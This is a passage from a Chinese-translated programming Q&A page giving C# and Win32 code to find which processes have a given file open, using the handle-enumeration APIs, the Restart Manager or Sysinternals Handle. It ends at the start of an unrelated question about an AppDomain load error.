        internal static extern NT_STATUS NtQueryObject(
            [In] IntPtr Handle,
            [In] OBJECT_INFORMATION_CLASS ObjectInformationClass,
            [In] IntPtr ObjectInformation,
            [In] int ObjectInformationLength,
            [Out] out int ReturnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern SafeProcessHandle OpenProcess(
            [In] ProcessAccessRights dwDesiredAccess,
            [In, MarshalAs(UnmanagedType.Bool)] bool bInheritHandle,
            [In] int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool DuplicateHandle(
            [In] IntPtr hSourceProcessHandle,
            [In] IntPtr hSourceHandle,
            [In] IntPtr hTargetProcessHandle,
            [Out] out SafeObjectHandle lpTargetHandle,
            [In] int dwDesiredAccess,
            [In, MarshalAs(UnmanagedType.Bool)] bool bInheritHandle,
            [In] DuplicateHandleOptions dwOptions);

        [DllImport("kernel32.dll")]
        internal static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern int GetProcessId(
            [In] IntPtr Process);

        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool CloseHandle(
            [In] IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern int QueryDosDevice(
            [In] string lpDeviceName,
            [Out] StringBuilder lpTargetPath,
            [In] int ucchMax);
    }
    #endregion

    //[ComVisible(true), EventTrackingEnabled(true)]
    public class DetectOpenFiles// : ServicedComponent
    {
        private static Dictionary<string, string> deviceMap;
        private const string networkDevicePrefix = "\\Device\\LanmanRedirector\\";

        private const int MAX_PATH = 260;

        private enum SystemHandleType
        {
            OB_TYPE_UNKNOWN = 0,
            OB_TYPE_TYPE = 1,
            OB_TYPE_DIRECTORY,
            OB_TYPE_SYMBOLIC_LINK,
            OB_TYPE_TOKEN,
            OB_TYPE_PROCESS,
            OB_TYPE_THREAD,
            OB_TYPE_UNKNOWN_7,
            OB_TYPE_EVENT,
            OB_TYPE_EVENT_PAIR,
            OB_TYPE_MUTANT,
            OB_TYPE_UNKNOWN_11,
            OB_TYPE_SEMAPHORE,
            OB_TYPE_TIMER,
            OB_TYPE_PROFILE,
            OB_TYPE_WINDOW_STATION,
            OB_TYPE_DESKTOP,
            OB_TYPE_SECTION,
            OB_TYPE_KEY,
            OB_TYPE_PORT,
            OB_TYPE_WAITABLE_PORT,
            OB_TYPE_UNKNOWN_21,
            OB_TYPE_UNKNOWN_22,
            OB_TYPE_UNKNOWN_23,
            OB_TYPE_UNKNOWN_24,
            //OB_TYPE_CONTROLLER,
            //OB_TYPE_DEVICE,
            //OB_TYPE_DRIVER,
            OB_TYPE_IO_COMPLETION,
            OB_TYPE_FILE
        };

        private const int handleTypeTokenCount = 27;
        private static readonly string[] handleTypeTokens = new string[] { 
            "", "", "Directory", "SymbolicLink", "Token",
            "Process", "Thread", "Unknown7", "Event", "EventPair", "Mutant",
            "Unknown11", "Semaphore", "Timer", "Profile", "WindowStation",
            "Desktop", "Section", "Key", "Port", "WaitablePort",
            "Unknown21", "Unknown22", "Unknown23", "Unknown24", 
            "IoCompletion", "File"
        };

        [StructLayout(LayoutKind.Sequential)]
        private struct SYSTEM_HANDLE_ENTRY
        {
            public int OwnerPid;
            public byte ObjectType;
            public byte HandleFlags;
            public short HandleValue;
            public int ObjectPointer;
            public int AccessMask;
        }

        /// <summary>
        /// Gets the open files enumerator.
        /// </summary>
        /// <param name="processId">The process id.</param>
        /// <returns></returns>
        public static IEnumerable<String> GetOpenFilesEnumerator(int processId)
        {
            return new OpenFiles(processId);
        }

        public static List<Process> GetProcessesUsingFile(string fName)
        {
            List<Process> result = new List<Process>();
            foreach (var p in Process.GetProcesses())
            {
                try
                {
                    if (DetectOpenFiles.GetOpenFilesEnumerator(p.Id).Contains(fName))
                    {
                        result.Add(p);
                    }
                }
                catch { }//some processes will fail
            }
            return result;
        }

        private sealed class OpenFiles : IEnumerable<String>
        {
            private readonly int processId;

            internal OpenFiles(int processId)
            {
                this.processId = processId;
            }

            #region IEnumerable<FileSystemInfo> Members

            public IEnumerator<String> GetEnumerator()
            {
                NT_STATUS ret;
                int length = 0x10000;
                // Loop, probing for required memory.

                do
                {
                    IntPtr ptr = IntPtr.Zero;
                    RuntimeHelpers.PrepareConstrainedRegions();
                    try
                    {
                        RuntimeHelpers.PrepareConstrainedRegions();
                        try { }
                        finally
                        {
                            // CER guarantees that the address of the allocated 
                            // memory is actually assigned to ptr if an 
                            // asynchronous exception occurs.
                            ptr = Marshal.AllocHGlobal(length);
                        }
                        int returnLength;
                        ret = NativeMethods.NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS.SystemHandleInformation, ptr, length, out returnLength);
                        if (ret == NT_STATUS.STATUS_INFO_LENGTH_MISMATCH)
                        {
                            // Round required memory up to the nearest 64KB boundary.
                            length = ((returnLength + 0xffff) & ~0xffff);
                        }
                        else if (ret == NT_STATUS.STATUS_SUCCESS)
                        {
                            int handleCount = Marshal.ReadInt32(ptr);
                            int offset = sizeof(int);
                            int size = Marshal.SizeOf(typeof(SYSTEM_HANDLE_ENTRY));
                            for (int i = 0; i < handleCount; i++)
                            {
                                SYSTEM_HANDLE_ENTRY handleEntry = (SYSTEM_HANDLE_ENTRY)Marshal.PtrToStructure((IntPtr)((int)ptr + offset), typeof(SYSTEM_HANDLE_ENTRY));
                                if (handleEntry.OwnerPid == processId)
                                {
                                    IntPtr handle = (IntPtr)handleEntry.HandleValue;
                                    SystemHandleType handleType;

                                    if (GetHandleType(handle, handleEntry.OwnerPid, out handleType) && handleType == SystemHandleType.OB_TYPE_FILE)
                                    {
                                        string devicePath;
                                        if (GetFileNameFromHandle(handle, handleEntry.OwnerPid, out devicePath))
                                        {
                                            string dosPath;
                                            if (ConvertDevicePathToDosPath(devicePath, out dosPath))
                                            {
                                                if (File.Exists(dosPath))
                                                {
                                                    yield return dosPath; // return new FileInfo(dosPath);
                                                }
                                                else if (Directory.Exists(dosPath))
                                                {
                                                    yield return dosPath; // new DirectoryInfo(dosPath);
                                                }
                                            }
                                        }
                                    }
                                }
                                offset += size;
                            }
                        }
                    }
                    finally
                    {
                        // CER guarantees that the allocated memory is freed, 
                        // if an asynchronous exception occurs. 
                        Marshal.FreeHGlobal(ptr);
                        //sw.Flush();
                        //sw.Close();
                    }
                }
                while (ret == NT_STATUS.STATUS_INFO_LENGTH_MISMATCH);
            }

            #endregion

            #region IEnumerable Members

            System.Collections.IEnumerator System.Collections.IEnumerable.GetEnumerator()
            {
                return GetEnumerator();
            }

            #endregion
        }

        #region Private Members

        private static bool GetFileNameFromHandle(IntPtr handle, int processId, out string fileName)
        {
            IntPtr currentProcess = NativeMethods.GetCurrentProcess();
            bool remote = (processId != NativeMethods.GetProcessId(currentProcess));
            SafeProcessHandle processHandle = null;
            SafeObjectHandle objectHandle = null;
            try
            {
                if (remote)
                {
                    processHandle = NativeMethods.OpenProcess(ProcessAccessRights.PROCESS_DUP_HANDLE, true, processId);
                    if (NativeMethods.DuplicateHandle(processHandle.DangerousGetHandle(), handle, currentProcess, out objectHandle, 0, false, DuplicateHandleOptions.DUPLICATE_SAME_ACCESS))
                    {
                        handle = objectHandle.DangerousGetHandle();
                    }
                }
                return GetFileNameFromHandle(handle, out fileName, 200);
            }
            finally
            {
                if (remote)
                {
                    if (processHandle != null)
                    {
                        processHandle.Close();
                    }
                    if (objectHandle != null)
                    {
                        objectHandle.Close();
                    }
                }
            }
        }
        private static bool GetFileNameFromHandle(IntPtr handle, out string fileName, int wait)
        {
            using (FileNameFromHandleState f = new FileNameFromHandleState(handle))
            {
                ThreadPool.QueueUserWorkItem(new WaitCallback(GetFileNameFromHandle), f);
                if (f.WaitOne(wait))
                {
                    fileName = f.FileName;
                    return f.RetValue;
                }
                else
                {
                    fileName = string.Empty;
                    return false;
                }
            }
        }

        private class FileNameFromHandleState : IDisposable
        {
            private ManualResetEvent _mr;
            private IntPtr _handle;
            private string _fileName;
            private bool _retValue;

            public IntPtr Handle
            {
                get
                {
                    return _handle;
                }
            }

            public string FileName
            {
                get
                {
                    return _fileName;
                }
                set
                {
                    _fileName = value;
                }

            }

            public bool RetValue
            {
                get
                {
                    return _retValue;
                }
                set
                {
                    _retValue = value;
                }
            }

            public FileNameFromHandleState(IntPtr handle)
            {
                _mr = new ManualResetEvent(false);
                this._handle = handle;
            }

            public bool WaitOne(int wait)
            {
                return _mr.WaitOne(wait, false);
            }

            public void Set()
            {
                try
                {
                    _mr.Set();
                }
                catch{}
            }
            #region IDisposable Members

            public void Dispose()
            {
                if (_mr != null)
                    _mr.Close();
            }

            #endregion
        }

        private static void GetFileNameFromHandle(object state)
        {
            FileNameFromHandleState s = (FileNameFromHandleState)state;
            string fileName;
            s.RetValue = GetFileNameFromHandle(s.Handle, out fileName);
            s.FileName = fileName;
            s.Set();
        }

        private static bool GetFileNameFromHandle(IntPtr handle, out string fileName)
        {
            IntPtr ptr = IntPtr.Zero;
            RuntimeHelpers.PrepareConstrainedRegions();
            try
            {
                int length = 0x200;  // 512 bytes
                RuntimeHelpers.PrepareConstrainedRegions();
                try { }
                finally
                {
                    // CER guarantees the assignment of the allocated 
                    // memory address to ptr, if an ansynchronous exception 
                    // occurs.
                    ptr = Marshal.AllocHGlobal(length);
                }
                NT_STATUS ret = NativeMethods.NtQueryObject(handle, OBJECT_INFORMATION_CLASS.ObjectNameInformation, ptr, length, out length);
                if (ret == NT_STATUS.STATUS_BUFFER_OVERFLOW)
                {
                    RuntimeHelpers.PrepareConstrainedRegions();
                    try { }
                    finally
                    {
                        // CER guarantees that the previous allocation is freed,
                        // and that the newly allocated memory address is 
                        // assigned to ptr if an asynchronous exception occurs.
                        Marshal.FreeHGlobal(ptr);
                        ptr = Marshal.AllocHGlobal(length);
                    }
                    ret = NativeMethods.NtQueryObject(handle, OBJECT_INFORMATION_CLASS.ObjectNameInformation, ptr, length, out length);
                }
                if (ret == NT_STATUS.STATUS_SUCCESS)
                {
                    fileName = Marshal.PtrToStringUni((IntPtr)((int)ptr + 8), (length - 9) / 2);
                    return fileName.Length != 0;
                }
            }
            finally
            {
                // CER guarantees that the allocated memory is freed, 
                // if an asynchronous exception occurs.
                Marshal.FreeHGlobal(ptr);
            }

            fileName = string.Empty;
            return false;
        }

        private static bool GetHandleType(IntPtr handle, int processId, out SystemHandleType handleType)
        {
            string token = GetHandleTypeToken(handle, processId);
            return GetHandleTypeFromToken(token, out handleType);
        }

        private static bool GetHandleType(IntPtr handle, out SystemHandleType handleType)
        {
            string token = GetHandleTypeToken(handle);
            return GetHandleTypeFromToken(token, out handleType);
        }

        private static bool GetHandleTypeFromToken(string token, out SystemHandleType handleType)
        {
            for (int i = 1; i < handleTypeTokenCount; i++)
            {
                if (handleTypeTokens[i] == token)
                {
                    handleType = (SystemHandleType)i;
                    return true;
                }
            }
            handleType = SystemHandleType.OB_TYPE_UNKNOWN;
            return false;
        }

        private static string GetHandleTypeToken(IntPtr handle, int processId)
        {
            IntPtr currentProcess = NativeMethods.GetCurrentProcess();
            bool remote = (processId != NativeMethods.GetProcessId(currentProcess));
            SafeProcessHandle processHandle = null;
            SafeObjectHandle objectHandle = null;
            try
            {
                if (remote)
                {
                    processHandle = NativeMethods.OpenProcess(ProcessAccessRights.PROCESS_DUP_HANDLE, true, processId);
                    if (NativeMethods.DuplicateHandle(processHandle.DangerousGetHandle(), handle, currentProcess, out objectHandle, 0, false, DuplicateHandleOptions.DUPLICATE_SAME_ACCESS))
                    {
                        handle = objectHandle.DangerousGetHandle();
                    }
                }
                return GetHandleTypeToken(handle);
            }
            finally
            {
                if (remote)
                {
                    if (processHandle != null)
                    {
                        processHandle.Close();
                    }
                    if (objectHandle != null)
                    {
                        objectHandle.Close();
                    }
                }
            }
        }

        private static string GetHandleTypeToken(IntPtr handle)
        {
            int length;
            NativeMethods.NtQueryObject(handle, OBJECT_INFORMATION_CLASS.ObjectTypeInformation, IntPtr.Zero, 0, out length);
            IntPtr ptr = IntPtr.Zero;
            RuntimeHelpers.PrepareConstrainedRegions();
            try
            {
                RuntimeHelpers.PrepareConstrainedRegions();
                try { }
                finally
                {
                    ptr = Marshal.AllocHGlobal(length);
                }
                if (NativeMethods.NtQueryObject(handle, OBJECT_INFORMATION_CLASS.ObjectTypeInformation, ptr, length, out length) == NT_STATUS.STATUS_SUCCESS)
                {
                    return Marshal.PtrToStringUni((IntPtr)((int)ptr + 0x60));
                }
            }
            finally
            {
                Marshal.FreeHGlobal(ptr);
            }
            return string.Empty;
        }

        private static bool ConvertDevicePathToDosPath(string devicePath, out string dosPath)
        {
            EnsureDeviceMap();
            int i = devicePath.Length;
            while (i > 0 && (i = devicePath.LastIndexOf('\\', i - 1)) != -1)
            {
                string drive;
                if (deviceMap.TryGetValue(devicePath.Substring(0, i), out drive))
                {
                    dosPath = string.Concat(drive, devicePath.Substring(i));
                    return dosPath.Length != 0;
                }
            }
            dosPath = string.Empty;
            return false;
        }

        private static void EnsureDeviceMap()
        {
            if (deviceMap == null)
            {
                Dictionary<string, string> localDeviceMap = BuildDeviceMap();
                Interlocked.CompareExchange<Dictionary<string, string>>(ref deviceMap, localDeviceMap, null);
            }
        }

        private static Dictionary<string, string> BuildDeviceMap()
        {
            string[] logicalDrives = Environment.GetLogicalDrives();
            Dictionary<string, string> localDeviceMap = new Dictionary<string, string>(logicalDrives.Length);
            StringBuilder lpTargetPath = new StringBuilder(MAX_PATH);
            foreach (string drive in logicalDrives)
            {
                string lpDeviceName = drive.Substring(0, 2);
                NativeMethods.QueryDosDevice(lpDeviceName, lpTargetPath, MAX_PATH);
                localDeviceMap.Add(NormalizeDeviceName(lpTargetPath.ToString()), lpDeviceName);
            }
            localDeviceMap.Add(networkDevicePrefix.Substring(0, networkDevicePrefix.Length - 1), "\\");
            return localDeviceMap;
        }

        private static string NormalizeDeviceName(string deviceName)
        {
            if (string.Compare(deviceName, 0, networkDevicePrefix, 0, networkDevicePrefix.Length, StringComparison.InvariantCulture) == 0)
            {
                string shareName = deviceName.Substring(deviceName.IndexOf('\\', networkDevicePrefix.Length) + 1);
                return string.Concat(networkDevicePrefix, shareName);
            }
            return deviceName;
        }

        #endregion
    }
} 
```

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2009-05-13T22:17:55.033

不是很简单，但在 Windows Vista 及更高版本上，您可以使用[重新启动管理器 API](http://msdn.microsoft.com/en-us/library/windows/desktop/cc948910%28v=vs.85%29.aspx)查看谁在使用文件。*[Internet Explorer 缓存设置](http://blogs.msdn.com/vistacompatteam/archive/2007/02/07/internet-explorer-caches-settings.aspx)*包括有关使用它来检测已`iexplore.exe`打开的进程的详细信息。

省略了很多细节：

```
// Start an RM session
RmStartSession(&sessionHandle, 0, sessionKey);

// Register the file you are checking
RmRegisterResources(sessionHandle, 1, filePathArray, 0, NULL, 0, NULL);

// Get all processes that have that file open.
RmGetList(sessionHAndle, &nProcInfoNeeded, &nProcInfo, processes, &rebootReason);
RmEndSession(sessionHandle); 
```

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2009-05-13T22:05:20.823

[句柄](http://technet.microsoft.com/en-us/sysinternals/bb896655.aspx)，来自[Windows Sysinternals](http://technet.microsoft.com/en-us/sysinternals/default.aspx)。这是 Microsoft 提供的免费命令行实用程序。

您可以运行它并解析结果。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2012-12-06T00:31:00.580

以下是基于 Iain Ballard 的代码转储生成的。它**坏了**：当您检索句柄名称时，它*偶尔会*锁定。此代码不包含针对该问题的任何解决方法，并且 .NET 留下了几个选项：`Thread.Abort`不能再中止当前在本机方法中的线程。

因此，有了该免责声明，这里是检索句柄的代码，该句柄已适应在 32 位和 64 位模式下工作（除了偶尔的锁定）：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;

namespace BrokenHandleRetrieval
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Enumerates open handles.");
            Console.WriteLine("This *will* lock up on calling HandleInfo.Name from time to time. Thread.Abort() won't help.");
            foreach (var hi in HandleUtil.GetHandles().Where(hi => hi.Type == HandleType.File))
                Console.WriteLine("pid: " + hi.ProcessId + ", name: " + hi.Name);
        }
    }

    public enum HandleType
    {
        Unknown,
        Other,
        File, Directory, SymbolicLink, Key,
        Process, Thread, Job, Session, WindowStation,
        Timer, Desktop, Semaphore, Token,
        Mutant, Section, Event, KeyedEvent, IoCompletion, IoCompletionReserve,
        TpWorkerFactory, AlpcPort, WmiGuid, UserApcReserve,
    }

    public class HandleInfo
    {
        public int ProcessId { get; private set; }
        public ushort Handle { get; private set; }
        public int GrantedAccess { get; private set; }
        public byte RawType { get; private set; }

        public HandleInfo(int processId, ushort handle, int grantedAccess, byte rawType)
        {
            ProcessId = processId;
            Handle = handle;
            GrantedAccess = grantedAccess;
            RawType = rawType;
        }

        private static Dictionary<byte, string> _rawTypeMap = new Dictionary<byte, string>();

        private string _name, _typeStr;
        private HandleType _type;

        public string Name { get { if (_name == null) initTypeAndName(); return _name; } }
        public string TypeString { get { if (_typeStr == null) initType(); return _typeStr; } }
        public HandleType Type { get { if (_typeStr == null) initType(); return _type; } }

        private void initType()
        {
            if (_rawTypeMap.ContainsKey(RawType))
            {
                _typeStr = _rawTypeMap[RawType];
                _type = HandleTypeFromString(_typeStr);
            }
            else
                initTypeAndName();
        }

        bool _typeAndNameAttempted = false;

        private void initTypeAndName()
        {
            if (_typeAndNameAttempted)
                return;
            _typeAndNameAttempted = true;

            IntPtr sourceProcessHandle = IntPtr.Zero;
            IntPtr handleDuplicate = IntPtr.Zero;
            try
            {
                sourceProcessHandle = NativeMethods.OpenProcess(0x40 /* dup_handle */, true, ProcessId);

                // To read info about a handle owned by another process we must duplicate it into ours
                // For simplicity, current process handles will also get duplicated; remember that process handles cannot be compared for equality
                if (!NativeMethods.DuplicateHandle(sourceProcessHandle, (IntPtr) Handle, NativeMethods.GetCurrentProcess(), out handleDuplicate, 0, false, 2 /* same_access */))
                    return;

                // Query the object type
                if (_rawTypeMap.ContainsKey(RawType))
                    _typeStr = _rawTypeMap[RawType];
                else
                {
                    int length;
                    NativeMethods.NtQueryObject(handleDuplicate, OBJECT_INFORMATION_CLASS.ObjectTypeInformation, IntPtr.Zero, 0, out length);
                    IntPtr ptr = IntPtr.Zero;
                    try
                    {
                        ptr = Marshal.AllocHGlobal(length);
                        if (NativeMethods.NtQueryObject(handleDuplicate, OBJECT_INFORMATION_CLASS.ObjectTypeInformation, ptr, length, out length) != NT_STATUS.STATUS_SUCCESS)
                            return;
                        _typeStr = Marshal.PtrToStringUni((IntPtr) ((int) ptr + 0x58 + 2 * IntPtr.Size));
                        _rawTypeMap[RawType] = _typeStr;
                    }
                    finally
                    {
                        Marshal.FreeHGlobal(ptr);
                    }
                }
                _type = HandleTypeFromString(_typeStr);

                // Query the object name
                if (_typeStr != null && GrantedAccess != 0x0012019f && GrantedAccess != 0x00120189 && GrantedAccess != 0x120089) // don't query some objects that could get stuck
                {
                    int length;
                    NativeMethods.NtQueryObject(handleDuplicate, OBJECT_INFORMATION_CLASS.ObjectNameInformation, IntPtr.Zero, 0, out length);
                    IntPtr ptr = IntPtr.Zero;
                    try
                    {
                        ptr = Marshal.AllocHGlobal(length);
                        if (NativeMethods.NtQueryObject(handleDuplicate, OBJECT_INFORMATION_CLASS.ObjectNameInformation, ptr, length, out length) != NT_STATUS.STATUS_SUCCESS)
                            return;
                        _name = Marshal.PtrToStringUni((IntPtr) ((int) ptr + 2 * IntPtr.Size));
                    }
                    finally
                    {
                        Marshal.FreeHGlobal(ptr);
                    }
                }
            }
            finally
            {
                NativeMethods.CloseHandle(sourceProcessHandle);
                if (handleDuplicate != IntPtr.Zero)
                    NativeMethods.CloseHandle(handleDuplicate);
            }
        }

        public static HandleType HandleTypeFromString(string typeStr)
        {
            switch (typeStr)
            {
                case null: return HandleType.Unknown;
                case "File": return HandleType.File;
                case "IoCompletion": return HandleType.IoCompletion;
                case "TpWorkerFactory": return HandleType.TpWorkerFactory;
                case "ALPC Port": return HandleType.AlpcPort;
                case "Event": return HandleType.Event;
                case "Section": return HandleType.Section;
                case "Directory": return HandleType.Directory;
                case "KeyedEvent": return HandleType.KeyedEvent;
                case "Process": return HandleType.Process;
                case "Key": return HandleType.Key;
                case "SymbolicLink": return HandleType.SymbolicLink;
                case "Thread": return HandleType.Thread;
                case "Mutant": return HandleType.Mutant;
                case "WindowStation": return HandleType.WindowStation;
                case "Timer": return HandleType.Timer;
                case "Semaphore": return HandleType.Semaphore;
                case "Desktop": return HandleType.Desktop;
                case "Token": return HandleType.Token;
                case "Job": return HandleType.Job;
                case "Session": return HandleType.Session;
                case "IoCompletionReserve": return HandleType.IoCompletionReserve;
                case "WmiGuid": return HandleType.WmiGuid;
                case "UserApcReserve": return HandleType.UserApcReserve;
                default: return HandleType.Other;
            }
        }
    }

    public static class HandleUtil
    {
        public static IEnumerable<HandleInfo> GetHandles()
        {
            // Attempt to retrieve the handle information
            int length = 0x10000;
            IntPtr ptr = IntPtr.Zero;
            try
            {
                while (true)
                {
                    ptr = Marshal.AllocHGlobal(length);
                    int wantedLength;
                    var result = NativeMethods.NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS.SystemHandleInformation, ptr, length, out wantedLength);
                    if (result == NT_STATUS.STATUS_INFO_LENGTH_MISMATCH)
                    {
                        length = Math.Max(length, wantedLength);
                        Marshal.FreeHGlobal(ptr);
                        ptr = IntPtr.Zero;
                    }
                    else if (result == NT_STATUS.STATUS_SUCCESS)
                        break;
                    else
                        throw new Exception("Failed to retrieve system handle information.");
                }

                int handleCount = IntPtr.Size == 4 ? Marshal.ReadInt32(ptr) : (int) Marshal.ReadInt64(ptr);
                int offset = IntPtr.Size;
                int size = Marshal.SizeOf(typeof(SystemHandleEntry));
                for (int i = 0; i < handleCount; i++)
                {
                    var struc = (SystemHandleEntry) Marshal.PtrToStructure((IntPtr) ((int) ptr + offset), typeof(SystemHandleEntry));
                    yield return new HandleInfo(struc.OwnerProcessId, struc.Handle, struc.GrantedAccess, struc.ObjectTypeNumber);
                    offset += size;
                }
            }
            finally
            {
                if (ptr != IntPtr.Zero)
                    Marshal.FreeHGlobal(ptr);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SystemHandleEntry
        {
            public int OwnerProcessId;
            public byte ObjectTypeNumber;
            public byte Flags;
            public ushort Handle;
            public IntPtr Object;
            public int GrantedAccess;
        }
    }

    enum NT_STATUS
    {
        STATUS_SUCCESS = 0x00000000,
        STATUS_BUFFER_OVERFLOW = unchecked((int) 0x80000005L),
        STATUS_INFO_LENGTH_MISMATCH = unchecked((int) 0xC0000004L)
    }

    enum SYSTEM_INFORMATION_CLASS
    {
        SystemBasicInformation = 0,
        SystemPerformanceInformation = 2,
        SystemTimeOfDayInformation = 3,
        SystemProcessInformation = 5,
        SystemProcessorPerformanceInformation = 8,
        SystemHandleInformation = 16,
        SystemInterruptInformation = 23,
        SystemExceptionInformation = 33,
        SystemRegistryQuotaInformation = 37,
        SystemLookasideInformation = 45
    }

    enum OBJECT_INFORMATION_CLASS
    {
        ObjectBasicInformation = 0,
        ObjectNameInformation = 1,
        ObjectTypeInformation = 2,
        ObjectAllTypesInformation = 3,
        ObjectHandleInformation = 4
    }

    static class NativeMethods
    {
        [DllImport("ntdll.dll")]
        internal static extern NT_STATUS NtQuerySystemInformation(
            [In] SYSTEM_INFORMATION_CLASS SystemInformationClass,
            [In] IntPtr SystemInformation,
            [In] int SystemInformationLength,
            [Out] out int ReturnLength);

        [DllImport("ntdll.dll")]
        internal static extern NT_STATUS NtQueryObject(
            [In] IntPtr Handle,
            [In] OBJECT_INFORMATION_CLASS ObjectInformationClass,
            [In] IntPtr ObjectInformation,
            [In] int ObjectInformationLength,
            [Out] out int ReturnLength);

        [DllImport("kernel32.dll")]
        internal static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            [In] int dwDesiredAccess,
            [In, MarshalAs(UnmanagedType.Bool)] bool bInheritHandle,
            [In] int dwProcessId);

        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool CloseHandle(
            [In] IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DuplicateHandle(
            [In] IntPtr hSourceProcessHandle,
            [In] IntPtr hSourceHandle,
            [In] IntPtr hTargetProcessHandle,
            [Out] out IntPtr lpTargetHandle,
            [In] int dwDesiredAccess,
            [In, MarshalAs(UnmanagedType.Bool)] bool bInheritHandle,
            [In] int dwOptions);
    }
} 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-05-13T23:04:38.763

试试[解锁器](http://en.wikipedia.org/wiki/Unlocker)。如果您尝试删除被另一个进程锁定的文件，它将列出锁定该文件的进程。然后，您可以通过关闭这些进程来解锁文件。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-05-13T22:54:03.820

我相信您需要在内核模式下运行代码才能完全回答这个问题（但我没有看过重启管理器 API）。

您可以枚举所有进程及其模块 - 因此，如果您要查找的文件是一个模块（DLL、EXE、OCX ...），那么您就可以开始了。但是如果它是一个文本文件，例如，你必须查看你在用户模式下看不到的内核句柄表。Handle.exe 有一个内核驱动程序可以做到这一点。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2016-07-27T17:50:46.927

我重写了`GetProcessesLockingFile()`解决方案中的方法。代码不起作用。

例如，您在文件夹`"C:\folder1\folder2"`2 (process1) 中有一个文件夹和一个进程。如果进程正在运行，`GetProcessesLockingFile()`则返回`"C:\folder1\folder2"`. 所以条件 `if (files.Contains(filePath))`=>`if ("C:\folder1\folder2".contains("C:\folder1\folder2\process1"))`从来都不是真的。

所以这是我的解决方案：

```
public static List<Process> GetProcessesLockingFile(FileInfo file)
{
    var procs = new List<Process>();

    var processListSnapshot = Process.GetProcesses();
    foreach (var process in processListSnapshot)
    {
        if (process.Id <= 4) { continue; } // system processes

        List<string> paths = GetFilesLockedBy(process);
        foreach (string path in paths)
        {
            string pathDirectory = path;
            if (!pathDirectory.EndsWith(Constants.DOUBLE_BACKSLASH))
            {
                pathDirectory = pathDirectory + Constants.DOUBLE_BACKSLASH;
            }
            string lastFolderName = Path.GetFileName(Path.GetDirectoryName(pathDirectory));

            if (file.FullName.Contains(lastFolderName))
            {
                procs.Add(process);
            }
        }
    }
    return procs;
} 
```

或使用字符串参数：

```
public static List<Process> GetProcessesLockingFile(string filePath)
{
    var procs = new List<Process>();

    var processListSnapshot = Process.GetProcesses();
    foreach (var process in processListSnapshot)
    {
        if (process.Id <= 4) { continue; } // system processes

        List<string> paths = GetFilesLockedBy(process);
        foreach (string path in paths)
        {
            string pathDirectory = path;
            if (!pathDirectory.EndsWith(Constants.DOUBLE_BACKSLASH))
            {
                pathDirectory = pathDirectory + Constants.DOUBLE_BACKSLASH;
            }
            string lastFolderName = Path.GetFileName(Path.GetDirectoryName(pathDirectory));

            if (filePath.Contains(lastFolderName))
            {
                procs.Add(process);
            }
        }
    }
    return procs;
} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-05-14T14:43:52.893

您绝对不需要在内核模式下运行（！！！）
这是一个 Win32 常见问题解答，因为 Windows 95（！）（在 C、Google 组、Win32 中）：当然从用户模式读取句柄表，并获取来自文件句柄的 PID ...

# .net - AppDomain 程序集加载导致致命的执行引擎错误 (6B3979C6) (80131506)

> ID：860662
> 
> 赞同：0
> 
> 时间：2009-05-13T22:03:27.707
> 
> 标签：.net, assemblies, appdomain

我们有一个类型缓存系统，以避免在每次应用程序启动时搜索所有类型的所有插件程序集，但是当从 .NET 1.1 移动到 2.0+ 时，事件日志会记录一个致命的执行引擎错误 (6B3979C6) ( AppDomain.Load() 上的 80131506)

当且***仅***当 1\. AppDomain 不是 AppDomain.CurrentDomain。2\. 程序集不在可执行文件的目录中。

我们允许用户在特定于项目的目录中提供他们自己的程序集，因此我们无法解决 2。

我相信 1\. 是需要的，因此我们可以在浏览类型后将 AppDomain 卸载到。

我不是此代码的所有者，但如果我没有提供足够的信息，我可以提出正确的问题。

此代码导致无法捕获的错误：

```
 private static void AddAssembly( System.AppDomain appDom, Manifest manifest, string filenameWithoutExtension )
    {
        try
        {
            // Test that the assembly can be loaded...
            System.Reflection.Assembly.ReflectionOnlyLoad(filenameWithoutExtension);

            System.Reflection.Assembly assem = appDom.Load( filenameWithoutExtension );
            ArrayList attributes = new ArrayList();
            //  System.Reflection.Assembly assem = System.Reflection.Assembly.LoadFrom(path+"\\"+file.Name);
            object[] attribs = assem.GetCustomAttributes( typeof(PlugInAttribute), false );
            if ( attribs.Length > 0 )
            {
                attribs = assem.GetCustomAttributes( false );
                foreach ( Attribute attr in attribs )
                {
                    object[] attrAttrs = attr.GetType().GetCustomAttributes(typeof(PlugInAttribute), false );
                    if ( attrAttrs.Length > 0 ) 
                    {
                        attributes.Add(attr.GetType().ToString());
                        break;
                    }
                }
            }
            if ( attribs.Length > 0 || attributes.Count > 0 )
            {
                Assembly assy = new Assembly( manifest );
                manifest.Assemblies.Add(assy);
                assy.Name = filenameWithoutExtension;
                assy.Version = AssemblyName.GetAssemblyName( System.IO.Path.Combine( manifest.Path, filenameWithoutExtension + ".dll") ).Version.ToString();
                assy.Attributes = (ArrayList)attributes.Clone();
                System.Type[] types = assem.GetTypes();
                foreach (System.Type type in types )
